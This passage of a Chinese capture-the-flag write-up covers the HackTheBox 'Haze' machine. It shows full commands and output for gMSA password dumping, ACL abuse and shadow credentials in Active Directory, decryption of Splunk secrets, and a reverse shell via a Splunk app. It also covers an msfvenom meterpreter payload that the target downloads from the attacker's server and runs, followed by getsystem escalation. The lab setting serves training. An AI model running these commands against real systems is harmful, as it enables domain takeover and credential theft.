Name                                       : Haze-IT-Backup
ObjectClass                                : msDS-GroupManagedServiceAccount
ObjectGUID                                 : 66f8d593-2f0b-4a56-95b4-01b326c7a780
PrincipalsAllowedToRetrieveManagedPassword : {CN=Mark Adams,CN=Users,DC=haze,DC=htb}
SamAccountName                             : Haze-IT-Backup$
SID                                        : S-1-5-21-323145914-28650650-2368316563-1111
UserPrincipalName      
```

设置后通过`gMASDumper`来获取`Haze-IT-Backup$`密码

```bash
⚡ root@kali  ~/Desktop/test/Haze/gMSADumper  python3 gMSADumper.py -u mark.adams -p 'Ld@p_Auth_Sp1unk@2k24' -d haze.htb -l haze.htb
Users or groups who can read password for Haze-IT-Backup$:
 > mark.adams
Haze-IT-Backup$:::735c02c6b2dc54c3c8c6891f55279ebc
Haze-IT-Backup$:aes256-cts-hmac-sha1-96:38c90a95f7e038a6cb57d3e21c405c2875e88f1edbb1e082f1dd75d01eda60fd
Haze-IT-Backup$:aes128-cts-hmac-sha1-96:0926f5e64d85018a506ecadff3df4f95
```

PS：哪里可以知道`MARK` 拥有修改**`PrincipalsAllowedToRetrieveManagedPassword`** 的权限？

```bash
*Evil-WinRM* PS C:\users\mark.adams\documents> Import-Module .\PowerView.ps1
*Evil-WinRM* PS C:\users\mark.adams\documents> Find-InterestingDomainAcl -ResolveGUIDs

ObjectDN                : CN=Haze-IT-Backup,CN=Managed Service Accounts,DC=haze,DC=htb
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : WriteProperty
ObjectAceType           : ms-DS-GroupMSAMembership
AceFlags                : None
AceType                 : AccessAllowedObject
InheritanceFlags        : None
SecurityIdentifier      : S-1-5-21-323145914-28650650-2368316563-1107
IdentityReferenceName   : gMSA_Managers
IdentityReferenceDomain : haze.htb
IdentityReferenceDN     : CN=gMSA_Managers,CN=Users,DC=haze,DC=htb
IdentityReferenceClass  : group
```

还能看到`Haze-IT-Backup$`对`Support_Services`拥有`WriteOwner`权限

```bash
ObjectDN                : CN=Support_Services,CN=Users,DC=haze,DC=htb
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : WriteOwner
ObjectAceType           : None
AceFlags                : None
AceType                 : AccessAllowed
InheritanceFlags        : None
SecurityIdentifier      : S-1-5-21-323145914-28650650-2368316563-1111
IdentityReferenceName   : Haze-IT-Backup$
IdentityReferenceDomain : haze.htb
IdentityReferenceDN     : CN=Haze-IT-Backup,CN=Managed Service Accounts,DC=haze,DC=htb
IdentityReferenceClass  : computer
```

从`BloodHound`中也能看出来

![image.png](image68.png)

使用`Haze-IT-Backup$` 获得的哦凭据来使用`BloodHound`来收集信息

```bash
⚡ root@kali  ~/Desktop/test/Haze/gMSADumper  bloodhound-python -u 'Haze-IT-Backup$' -d 'haze.htb' -ns 10.10.11.61 --zip -c All -dc 'dc01.haze.htb' --hashes '0926f5e64d85018a506ecadff3df4f95:735c02c6b2dc54c3c8c6891f55279ebc'
INFO: Found AD domain: haze.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: dc01.haze.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.haze.htb
INFO: Found 9 users
INFO: Found 57 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 20 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc01.haze.htb
INFO: Done in 00M 17S
INFO: Compressing output into 20250331073045_bloodhound.zip
```

有一条路径可以修改`EDWARD.MARTIN` 的密码（失败的尝试）

![image.png](image69.png)

跟着`BloodHound`提示走，修改`SUPPORT_SERVICES` 的所有者从`Domain admins`修改为`Haze-IT-Backup$`

```bash
⚡ root@kali  ~/Desktop/test/Haze/gMSADumper  owneredit.py -action write -target 'SUPPORT_SERVICES' -new-owner 'Haze-IT-Backup$' haze.htb/'Haze-IT-Backup$' -hashes ':735c02c6b2dc54c3c8c6891f55279ebc' -dc-ip 10.10.11.61
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Current owner information below
[*] - SID: S-1-5-21-323145914-28650650-2368316563-512
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=haze,DC=htb
[*] OwnerSid modified successfully!
```

赋予自己`SUPPORT_SERVICES` 完全权限

```bash
⚡ root@kali  ~/Desktop/test/Haze/gMSADumper  dacledit.py -action write -target 'SUPPORT_SERVICES' -rights FullControl -principal 'Haze-IT-Backup$' haze.htb/'Haze-IT-Backup$' -hashes ':735c02c6b2dc54c3c8c6891f55279ebc' -dc-ip 10.10.11.61

[*] DACL backed up to dacledit-20250331-080046.bak
[*] DACL modified successfully
```

修改密码….失败

```bash
⚡ root@kali  ~/Desktop/test/Haze  pth-net rpc password "edward.martin" 'Aa118811' -U "haze.htb"/"Haze-IT-Backup$"%"0926f5e64d85018a506ecadff3df4f95":"735c02c6b2dc54c3c8c6891f55279ebc" -S "dc01.haze.htb"
E_md4hash wrapper called.
HASH PASS: Substituting user supplied NTLM HASH...
Failed to set password for 'edward.martin' with error: Access is denied..
```

再寻找别的路子，发现`SUPPORT_SERVICES`还对matin拥有`AddKeyCredentialLink`属性

![image.png](image70.png)

可以使用`pywhisker`给目标账户添加**`msDS-KeyCredentialLink`** 属性然后进行密钥登陆，而无需密码

要先将`Haze-IT-Backup$`添加到组，先获取其`TGT`票据

```bash
⚡ root@kali  ~/Desktop/Tools/Domain/bloodyAD  ntpdate -s 10.10.11.61  
⚡ root@kali  ~/Desktop/Tools/Domain/bloodyAD  getTGT.py haze.htb/'Haze-IT-Backup$' -hashes '0926f5e64d85018a506ecadff3df4f95':'735c02c6b2dc54c3c8c6891f55279ebc' -dc-ip 10.10.11.61
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in Haze-IT-Backup$.ccache
⚡ root@kali  ~/Desktop/Tools/Domain/bloodyAD  export KRB5CCNAME=Haze-IT-Backup.ccache         
```

再通过`bloodyAD`将自己添加`SUPPORT_SERVICES` 

```bash
⚡ root@kali  ~/Desktop/Tools/Domain/bloodyAD  python3 bloodyAD.py --host dc01.haze.htb -d haze.htb -u "Haze-IT-Backup$" -k add groupMember "SUPPORT_SERVICES" "Haze-IT-Backup$"                                                              
[+] Haze-IT-Backup$ added to SUPPORT_SERVICES
```

通过`pywhisker`给目标账户添加**`msDS-KeyCredentialLink`** 属性，运行成功后生成了 PFX 证书（`mdpJu0Mx.pfx`）用于 **PKINIT** 认证，提示我们可以使用`PKINITtools`

```bash
⚡ root@kali  ~/Desktop/Tools/Domain/pywhisker/pywhisker  python3 pywhisker.py -d haze.htb -u "Haze-IT-Backup$" -H "0926f5e64d85018a506ecadff3df4f95":"735c02c6b2dc54c3c8c6891f55279ebc" --target "edward.martin" --action "add"
[*] Searching for the target account
[*] Target user found: CN=Edward Martin,CN=Users,DC=haze,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: f529684c-94a0-f254-102e-022b29257375
[*] Updating the msDS-KeyCredentialLink attribute of edward.martin
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] Converting PEM -> PFX with cryptography: mdpJu0Mx.pfx
[+] PFX exportiert nach: mdpJu0Mx.pfx
[i] Passwort für PFX: 9A16naTa46UFxd15fGWs
[+] Saved PFX (#PKCS12) certificate & key at path: mdpJu0Mx.pfx
[*] Must be used with password: 9A16naTa46UFxd15fGWs
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```

使用`PKINITtools`通过`pfx`证书生成`TGT` ，并将其导入到环境变量

```bash
⚡ root@kali  ~/Desktop/Tools/Domain/PKINITtools  python3 gettgtpkinit.py haze.htb/edward.martin -cert-pfx ../pywhisker/pywhisker/mdpJu0Mx.pfx -pfx-pass 9A16naTa46UFxd15fGWs martin.ccache
2025-04-01 05:36:57,751 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2025-04-01 05:36:57,857 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2025-04-01 05:37:06,040 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2025-04-01 05:37:06,040 minikerberos INFO     c0ca345d16085d5058f66534cef843377b461bda39976dced6b9b2ab332b3aaf
INFO:minikerberos:c0ca345d16085d5058f66534cef843377b461bda39976dced6b9b2ab332b3aaf
2025-04-01 05:37:06,049 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file
```

因为`martin`在远程组里面，可以通过`winrm`进行连接

首先创建`realm`文件

```bash
[libdefaults]
    default_realm = HAZE.HTB
    dns_lookup_realm = true
    dns_lookup_kdc = true

[realms]
    HAZE.HTB = {
        kdc = dc01.haze.htb
        admin_server = dc01.haze.htb
        default_domain = dc01.haze.htb
    }

[domain_realm]
    haze.htb = HAZE.HTB
    .haze.htb = HAZE.HTB
```

使用`evil-winrm`进行登录，登录成功

```bash
⚡ root@kali  ~/Desktop/Tools/Domain/PKINITtools  evil-winrm -i dc01.haze.htb -r haze.htb   
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\edward.martin\Documents> 
```

获得user.txt

```bash
*Evil-WinRM* PS C:\Users\edward.martin\desktop> type user.txt
f907cd5fe75b817de491a3d82b730c63
```

## 提权

`BloodHound`分析

![image.png](image71.png)

没找到可以利用的的方法，翻找一下文件，因为是`backup_reviewers`组的成员

```bash
*Evil-WinRM* PS C:\Users\edward.martin\Documents> cd ../../../backups
*Evil-WinRM* PS C:\backups> ls

    Directory: C:\backups

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          3/5/2025  12:33 AM                Splunk
```

`Splunk`的备份，Dump出来

```bash
⚡ root@kali  ~/Desktop/test/Haze  evil-winrm -i dc01.haze.htb -r haze.htb
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\edward.martin\Documents> download ../../../backups/splunk
                                        
Info: Downloading C:\Users\edward.martin\Documents\../../../backups/splunk to splunk
                                        
Info: Download successful!
```

解压后检索敏感信息

```bash
 ⚡ root@kali  ~/Desktop/test/Haze/splunk/Splunk  grep -m1 -rE 'pass' ./
```

发现`bindDNpassword`和之前获得不一样了

![image.png](image72.png)

像是 `alexander.green` 的凭据

```bash
⚡ root@kali  ~/Desktop/test/Haze/splunk/Splunk  cat var/run/splunk/confsnapshot/baseline_local/system/local/authentication.conf 
[default]

minPasswordLength = 8
minPasswordUppercase = 0
minPasswordLowercase = 0
minPasswordSpecial = 0
minPasswordDigit = 0

[Haze LDAP Auth]

SSLEnabled = 0
anonymous_referrals = 1
bindDN = CN=alexander.green,CN=Users,DC=haze,DC=htb
bindDNpassword = $1$YDz8WfhoCWmf6aTRkA+QqUI=
charset = utf8
emailAttribute = mail
enableRangeRetrieval = 0
groupBaseDN = CN=Splunk_Admins,CN=Users,DC=haze,DC=htb
groupMappingAttribute = dn
groupMemberAttribute = member
groupNameAttribute = cn
host = dc01.haze.htb
nestedGroups = 0
network_timeout = 20
pagelimit = -1
port = 389
realNameAttribute = cn
sizelimit = 1000
timelimit = 15
userBaseDN = CN=Users,DC=haze,DC=htb
userNameAttribute = samaccountname

[authentication]
authSettings = Haze LDAP Auth
authType = LDAP#                               
```

再使用`Splunk.Secret`来解密，这里使用的`Splunk.Secret` 是备份文件夹下面的

```bash
⚡ root@kali  ~/Desktop/test/Haze/splunk/Splunk/etc/auth  splunksecrets splunk-decrypt -S splunk.secret --ciphertext '$1$YDz8WfhoCWmf6aTRkA+QqUI='
/root/.local/share/pipx/venvs/splunksecrets/lib/python3.12/site-packages/splunksecrets.py:48: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  algorithm = algorithms.ARC4(key)
Sp1unkadmin@2k24
```

获得密码`Sp1unkadmin@2k24`

在`BloodHound`中查看Alexander的信息，Alexander是`SPLUNK_ADMINS`的成员，应该可以登录`WEB`端

![image.png](image73.png)

尝试`admin:Sp1unkadmin@2k24` 成功进入后台

![image.png](image74.png)

通过搜索引擎检索，Splunk 后台貌似拥有安装自定义应用反弹`Shell`的方法，这里也存在上传页面，可以进行尝试

![image.png](image75.png)

(PS:一开始尝试了https://github.com/TBGSecurity/splunk_shells，然后发现无法执行搜索..)

通过工具来获得`shell`：https://github.com/0xjpuff/reverse_shell_splunk

照着流程走即可

```bash
 ⚡ root@kali  /usr/share/windows-resources/powersploit/Recon  nc -lvp 4444
listening on [any] 4444 ...
connect to [xxxxxxx] from haze.htb [10.10.11.61] 64713
whoami
haze\alexander.green
PS C:\Windows\system32> 
```

我们将他传到MSF，先创建 payload

```bash
⚡ root@kali  ~/Desktop/test/Haze  msfvenom -p windows/meterpreter/reverse_tcp lhost=xxxxxxx lport=4443 -f exe -o shell.exe
Warning: KRB5CCNAME environment variable not supported - unsetting
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
Saved as: shell.exe
 ⚡ root@kali  ~/Desktop/test/Haze  python -m http.server 8081
Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...
```

MSF 监听

```bash
msf6 > use exploit/multi/handler 
[*] Using configured payload windows/meterpreter/reverse_tcp                  
msf6 exploit(multi/handler) > set lport 4443                                                                                                                 
lport => 4443                                                                                                                                                
msf6 exploit(multi/handler) > set lhost xxxxx
msf6 exploit(multi/handler) > run
```

靶机拉取

```bash
PS C:\users\alexander.green\desktop> wget xxxxxxx:8081/shell.exe -o shell.exe
PS C:\users\alexander.green\desktop> dir

    Directory: C:\users\alexander.green\desktop

Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----          4/1/2025   7:35 AM          73802 shell.exe                                                            

PS C:\users\alexander.green\desktop> ./shell.exe
```

MSF 就能接收到 `shell` 了

```bash
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on xxxxxxx:4443 
[*] Sending stage (177734 bytes) to 10.10.11.61
[*] Meterpreter session 1 opened (xxxxxxx:4443 -> 10.10.11.61:64026) at 2025-04-01 10:35:34 -0400

meterpreter > 
```

尝试提权，直接成了

```bash
meterpreter > getsystem
...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

读取 `root.txt`

```bash
C:\Users\Administrator\Desktop>type root.txt
type root.txt
72c2d39ecedd0b40f3d8be2721d52748
```

## 总结

好玩，涉及的域渗透知识很多，不懂的也很多，学习到了gMSA组的利用，以及**`KeyCredentialLink`** 获得用户TGT，还有很多的思路。没提示的话感觉会倒在枚举用户名的那块。比前几期的域机器体验好多了;D
